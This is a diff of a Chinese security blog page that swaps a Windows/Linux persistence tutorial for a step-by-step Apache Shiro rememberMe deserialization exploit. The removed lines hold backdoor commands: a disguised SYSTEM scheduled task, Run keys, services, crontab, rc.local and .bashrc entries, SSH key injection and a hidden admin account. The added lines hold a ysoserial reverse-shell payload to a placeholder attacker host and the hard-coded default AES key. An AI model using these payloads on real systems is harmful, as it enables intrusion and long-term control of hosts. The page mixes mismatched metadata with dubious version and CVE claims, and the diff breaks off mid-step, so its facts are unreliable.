@@ -1,110 +1,150 @@
-<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Windows 与 Linux 权限维持（后门）方法：计划任务、注册表、启动项、WMI 事件、SSH Key、systemd、LD_PRELOAD，以及检测与清理。"><title>权限维持实战：Windows 与 Linux 后门</title><link rel=canonical href=https://souljian.cn/p/751088076/><link rel=stylesheet href=/scss/style.min.81579ea678e30582aa60028bfe3192821d6c0fee666ee279be318fb5b558916b.css><meta property='og:title' content="权限维持实战：Windows 与 Linux 后门"><meta property='og:description' content="Windows 与 Linux 权限维持（后门）方法：计划任务、注册表、启动项、WMI 事件、SSH Key、systemd、LD_PRELOAD，以及检测与清理。"><meta property='og:url' content='https://souljian.cn/p/751088076/'><meta property='og:site_name' content='SoulJian小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='权限维持'><meta property='article:tag' content='后门'><meta property='article:tag' content='Windows'><meta property='article:tag' content='Linux'><meta property='article:tag' content='内网渗透'><meta property='article:published_time' content='2026-08-29T19:50:00+08:00'><meta property='article:modified_time' content='2026-08-29T19:50:00+08:00'><meta name=twitter:title content="权限维持实战：Windows 与 Linux 后门"><meta name=twitter:description content="Windows 与 Linux 权限维持（后门）方法：计划任务、注册表、启动项、WMI 事件、SSH Key、systemd、LD_PRELOAD，以及检测与清理。"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Windows 与 Linux 权限维持（后门）方法：计划任务、注册表、启动项、WMI 事件、SSH Key、systemd、LD_PRELOAD，以及检测与清理。"><title>Shiro rememberMe 反序列化漏洞复现（550 与 721）</title><link rel=canonical href=https://souljian.cn/p/751088076/><link rel=stylesheet href=/scss/style.min.81579ea678e30582aa60028bfe3192821d6c0fee666ee279be318fb5b558916b.css><meta property='og:title' content="权限维持实战：Windows 与 Linux 后门"><meta property='og:description' content="Windows 与 Linux 权限维持（后门）方法：计划任务、注册表、启动项、WMI 事件、SSH Key、systemd、LD_PRELOAD，以及检测与清理。"><meta property='og:url' content='https://souljian.cn/p/751088076/'><meta property='og:site_name' content='SoulJian小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Shiro'><meta property='article:tag' content='反序列化'><meta property='article:tag' content='rememberMe'><meta property='article:tag' content='RCE'><meta property='article:tag' content='漏洞复现'><meta property='article:tag' content='Java'><meta property='article:published_time' content='2026-08-29T21:00:00+08:00'><meta property='article:modified_time' content='2026-08-30T10:00:00+08:00'><meta name=twitter:title content="权限维持实战：Windows 与 Linux 后门"><meta name=twitter:description content="Windows 与 Linux 权限维持（后门）方法：计划任务、注册表、启动项、WMI 事件、SSH Key、systemd、LD_PRELOAD，以及检测与清理。"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
 <span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_d0e0f681fd935e1f.jpg width=300 height=303 class=site-logo loading=lazy alt=Avatar>
 </a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>SoulJian小站</a></h1><h2 class=site-description>人生所有的痛苦，皆来自于我执</h2></div></header><ol class=menu-social><li><a href=https://github.com/souljian03 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
 <span>归档</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
 <span>搜索</span></a></li><li><a href=/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
 <span>友情链接</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
 <svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
-<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#写在前面合法学习边界>写在前面：合法学习边界</a></li><li><a href=#一原理>一、原理</a></li><li><a href=#二windows-权限维持>二、Windows 权限维持</a><ol><li><a href=#计划任务>计划任务</a></li><li><a href=#注册表-run-键>注册表 Run 键</a></li><li><a href=#服务>服务</a></li><li><a href=#启动文件夹>启动文件夹</a></li><li><a href=#wmi-事件订阅>WMI 事件订阅</a></li><li><a href=#其他>其他</a></li></ol></li><li><a href=#三linux-权限维持>三、Linux 权限维持</a><ol><li><a href=#crontab>crontab</a></li><li><a href=#rclocal--systemd>rc.local / systemd</a></li><li><a href=#用户登录脚本>用户登录脚本</a></li><li><a href=#ssh-后门>SSH 后门</a></li><li><a href=#ld_preload--pam>LD_PRELOAD / PAM</a></li></ol></li><li><a href=#影响与危害>影响与危害</a></li><li><a href=#权限维持操作步骤>权限维持操作步骤</a></li><li><a href=#四检测与清理>四、检测与清理</a><ol><li><a href=#windows>Windows</a></li><li><a href=#linux>Linux</a></li></ol></li><li><a href=#五小结>五、小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/>内网渗透</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/751088076/>权限维持实战：Windows 与 Linux 后门</a></h2><h3 class=article-subtitle>Windows 与 Linux 权限维持（后门）方法：计划任务、注册表、启动项、WMI 事件、SSH Key、systemd、LD_PRELOAD，以及检测与清理。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
-<time class=article-time--published datetime=2026-08-29T19:50:00+08:00>Aug 29, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
-<time class=article-time--reading>阅读时长: 2 分钟</time></div></footer></div></header><section class=article-content><h2 id=写在前面合法学习边界>写在前面：合法学习边界</h2><p>权限维持只允许在授权靶场进行。在真实系统留后门可能触犯法律。本文攻防视角，重点也在“如何发现与清理”。</p><h2 id=一原理>一、原理</h2><p>渗透拿下主机后，为避免“重连一次就丢”，会做权限维持（持久化）：把后门藏进系统自启动机制，让它在重启/登录后仍能复活。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>核心思路：借系统“自动运行”的机制藏后门
-</span></span></code></pre></td></tr></table></div></div><h2 id=二windows-权限维持>二、Windows 权限维持</h2><h3 id=计划任务>计划任务</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl>schtasks /create /tn <span class=s2>&#34;svchost&#34;</span> /tr <span class=s2>&#34;C:\tmp\x.exe&#34;</span> /sc onstart /ru SYSTEM
-</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: 解释：创建开机自启任务，伪装成系统服务名，以 SYSTEM 运行</span>
-</span></span></code></pre></td></tr></table></div></div><h3 id=注册表-run-键>注册表 Run 键</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#写在前面合法学习边界>写在前面：合法学习边界</a></li><li><a href=#一原理>一、原理</a></li><li><a href=#二影响与危害>二、影响与危害</a></li><li><a href=#三利用--复现>三、利用 / 复现</a><ol><li><a href=#环境准备>环境准备</a></li><li><a href=#第-1-步确认目标使用-shiro>第 1 步：确认目标使用 Shiro</a></li><li><a href=#第-2-步生成恶意序列化对象>第 2 步：生成恶意序列化对象</a></li><li><a href=#第-3-步aes-加密并构造-cookie>第 3 步：AES 加密并构造 Cookie</a></li><li><a href=#第-4-步发送恶意-cookie>第 4 步：发送恶意 Cookie</a></li><li><a href=#第-5-步接收反弹-shell>第 5 步：接收反弹 shell</a></li><li><a href=#shiro-cve-2020-1957721-绕过>Shiro CVE-2020-1957（721 绕过）</a></li></ol></li><li><a href=#四gadget-链选择>四、Gadget 链选择</a></li><li><a href=#五检测>五、检测</a></li><li><a href=#六防御与修复>六、防御与修复</a></li><li><a href=#七报告中的正确写法>七、报告中的正确写法</a></li><li><a href=#八小结>八、小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E6%BC%8F%E6%B4%9E/ style=background-color:#2a9d8f;color:#fff>漏洞</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/751088076/>Shiro rememberMe 反序列化漏洞复现（550 与 721）</a></h2><h3 class=article-subtitle>Shiro rememberMe 反序列化漏洞完整复现：CVE-2016-4437（550）与 CVE-2020-1957（721）、AES 密钥、Gadget 链与修复加固。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-08-29T21:00:00+08:00>Aug 29, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 2 分钟</time></div></footer></div></header><section class=article-content><h2 id=写在前面合法学习边界>写在前面：合法学习边界</h2><p>Shiro 漏洞利用只用于授权靶场。对真实系统发送恶意序列化数据可能触犯法律。</p><h2 id=一原理>一、原理</h2><p>Apache Shiro 的 rememberMe 功能会在客户端 Cookie 中保存用户身份标识，使用 <strong>AES 加密</strong>。问题在于：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v up /d <span class=s2>&#34;C:\tmp\x.exe&#34;</span>
-</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: 解释：写注册表 Run 键，用户登录时自动运行</span>
-</span></span><span class=line><span class=cl># 或 HKLM\...\Run 对所有用户生效
-</span></span></code></pre></td></tr></table></div></div><h3 id=服务>服务</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>1. Shiro 5.50（默认密钥）：硬编码密钥，攻击者可直接解密并篡改 Cookie
+</span></span><span class=line><span class=cl>2. Shiro ≤ 1.4.0：即使换密钥，反序列化时仍可触发 Gadget 链执行 RCE
+</span></span><span class=line><span class=cl>3. Shiro 1.4.1 修复：AES 改为 128 位 + 签名，但默认密钥问题仍存在
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl>sc create <span class=s2>&#34;Upd&#34;</span> binPath= <span class=s2>&#34;C:\tmp\x.exe&#34;</span> start= auto
-</span></span><span class=line><span class=cl>sc start Upd
-</span></span></code></pre></td></tr></table></div></div><h3 id=启动文件夹>启动文件夹</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>shell:startup 目录放快捷方式/可执行文件
-</span></span><span class=line><span class=cl>用户登录即运行
-</span></span></code></pre></td></tr></table></div></div><h3 id=wmi-事件订阅>WMI 事件订阅</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>WMI 事件（如开机/定时）触发执行
-</span></span><span class=line><span class=cl>隐蔽性强，常规检查难发现
-</span></span></code></pre></td></tr></table></div></div><h3 id=其他>其他</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>攻击流程：
+</span></span><span class=line><span class=cl>构造恶意序列化对象 → AES 加密（用已知/默认密钥） → 放入 Cookie rememberMe → 服务端解密反序列化 → RCE
+</span></span></code></pre></td></tr></table></div></div><h2 id=二影响与危害>二、影响与危害</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>后门账户：net user hack P@ss /add &amp;&amp; 加管理员
-</span></span><span class=line><span class=cl>黄金票据：伪造 krbtgt 持久访问域
-</span></span><span class=line><span class=cl>C2 服务：把 Beacon/MSF 包成服务
-</span></span></code></pre></td></tr></table></div></div><h2 id=三linux-权限维持>三、Linux 权限维持</h2><h3 id=crontab>crontab</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>• 直接 RCE（Java Web 应用权限）
+</span></span><span class=line><span class=cl>• 影响所有使用 Shiro 的 Java Web 应用
+</span></span><span class=line><span class=cl>• 默认密钥问题长期存在（硬编码 &#34;kPHbIxhk5nx4W92cYp8XgQ==&#34;）
+</span></span></code></pre></td></tr></table></div></div><h2 id=三利用--复现>三、利用 / 复现</h2><h3 id=环境准备>环境准备</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>crontab -l<span class=p>;</span> <span class=nb>echo</span> <span class=s2>&#34;*/5 * * * * /tmp/x.sh&#34;</span><span class=o>)</span><span class=p>|</span>crontab -
-</span></span><span class=line><span class=cl><span class=c1># 解释：先读现有 crontab，追加一条每 5 分钟执行的命令再写回（避免覆盖原任务）</span>
-</span></span></code></pre></td></tr></table></div></div><h3 id=rclocal--systemd>rc.local / systemd</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;/tmp/x.sh &amp;&#39;</span> &gt;&gt; /etc/rc.local
-</span></span><span class=line><span class=cl><span class=c1># 解释：追加到开机脚本，系统启动即运行</span>
-</span></span><span class=line><span class=cl><span class=c1># 或写 systemd service 开机启动</span>
-</span></span></code></pre></td></tr></table></div></div><h3 id=用户登录脚本>用户登录脚本</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;/tmp/x.sh &amp;&#39;</span> &gt;&gt; ~/.bashrc
-</span></span><span class=line><span class=cl><span class=c1># 解释：用户每次开终端都会执行，适合常见用户后门</span>
-</span></span></code></pre></td></tr></table></div></div><h3 id=ssh-后门>SSH 后门</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=err>&#39;</span>ssh-rsa AAAA...  &gt;&gt; /root/.ssh/authorized_keys
-</span></span><span class=line><span class=cl><span class=c1># 解释：写入公钥后，攻击者可用对应私钥免密登录，非常隐蔽</span>
-</span></span></code></pre></td></tr></table></div></div><h3 id=ld_preload--pam>LD_PRELOAD / PAM</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>LD_PRELOAD 劫持库
-</span></span><span class=line><span class=cl>PAM 后门记录/接受指定密码
-</span></span></code></pre></td></tr></table></div></div><h2 id=影响与危害>影响与危害</h2><p>权限维持若被滥用：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>失陷主机被长期控制
-</span></span><span class=line><span class=cl>后门绕过杀软与人工排查
-</span></span><span class=line><span class=cl>持续窃取数据、横向移动
-</span></span></code></pre></td></tr></table></div></div><p>风险等级：高。防守难点在于后门藏进正常自启动机制，难发现。</p><h2 id=权限维持操作步骤>权限维持操作步骤</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>靶机：Java + Shiro ≤ 1.4.0
+</span></span><span class=line><span class=cl>攻击机：ysoserial（Gadget 链）+ AES 密钥
+</span></span></code></pre></td></tr></table></div></div><h3 id=第-1-步确认目标使用-shiro>第 1 步：确认目标使用 Shiro</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>第 1 步：根据系统选持久化方式（Windows 计划任务/注册表；Linux crontab/SSH Key）
-</span></span><span class=line><span class=cl>第 2 步：先测一次是否能触发（重启/登录/定时）
-</span></span><span class=line><span class=cl>第 3 步：隐藏痕迹（伪服务名、隐蔽路径、去特殊字符）
-</span></span><span class=line><span class=cl>第 4 步：结合 C2/后门做成“自动回连 + 自恢复”
-</span></span><span class=line><span class=cl>第 5 步：记录后门位置，便于后续清理
-</span></span></code></pre></td></tr></table></div></div><h2 id=四检测与清理>四、检测与清理</h2><h3 id=windows>Windows</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 请求目标站点，检查响应 Cookie 是否含 rememberMe</span>
+</span></span><span class=line><span class=cl>curl -v http://靶机/login 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=p>|</span> grep -i <span class=s2>&#34;rememberMe&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1># 预期：Set-Cookie: rememberMe=deleteMe</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 检查 Shiro 版本</span>
+</span></span><span class=line><span class=cl><span class=c1># 查看 /shiro/index 等特征页面</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=第-2-步生成恶意序列化对象>第 2 步：生成恶意序列化对象</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>计划任务审计、启动项（Autoruns）检查
-</span></span><span class=line><span class=cl>服务、注册表 Run、WMI 事件订阅排查
-</span></span><span class=line><span class=cl>后门账户（net user / 克隆账户）检查
-</span></span><span class=line><span class=cl>EDR 对异常自启动行为告警
-</span></span></code></pre></td></tr></table></div></div><h3 id=linux>Linux</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 用 ysoserial 生成 CommonsCollections 链的序列化对象</span>
+</span></span><span class=line><span class=cl>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class=s2>&#34;命令&#34;</span> &gt; payload.bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 示例命令</span>
+</span></span><span class=line><span class=cl>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class=s2>&#34;calc&#34;</span> &gt; payload.bin
+</span></span><span class=line><span class=cl><span class=c1># Linux 反弹 shell</span>
+</span></span><span class=line><span class=cl>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/攻击机/4444 0&gt;&amp;1&#34;</span> &gt; payload.bin
+</span></span></code></pre></td></tr></table></div></div><h3 id=第-3-步aes-加密并构造-cookie>第 3 步：AES 加密并构造 Cookie</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>crontab -l、/etc/cron.* 检查
-</span></span><span class=line><span class=cl>rc.local、systemd 服务审计
-</span></span><span class=line><span class=cl>~/.bashrc、authorized_keys 检查
-</span></span><span class=line><span class=cl>文件哈希比对、进程与网络连接排查
-</span></span></code></pre></td></tr></table></div></div><p>清理思路：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 使用默认密钥加密（Shiro 默认 key）</span>
+</span></span><span class=line><span class=cl>python3 shiro_exploit.py payload.bin rememberMe.cookie
+</span></span><span class=line><span class=cl><span class=c1># 密钥：kPHbIxhk5nx4W92cYp8XgQ==</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 或用 Java 代码直接加密</span>
+</span></span><span class=line><span class=cl><span class=c1># 见下方 Java 代码示例</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=第-4-步发送恶意-cookie>第 4 步：发送恶意 Cookie</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
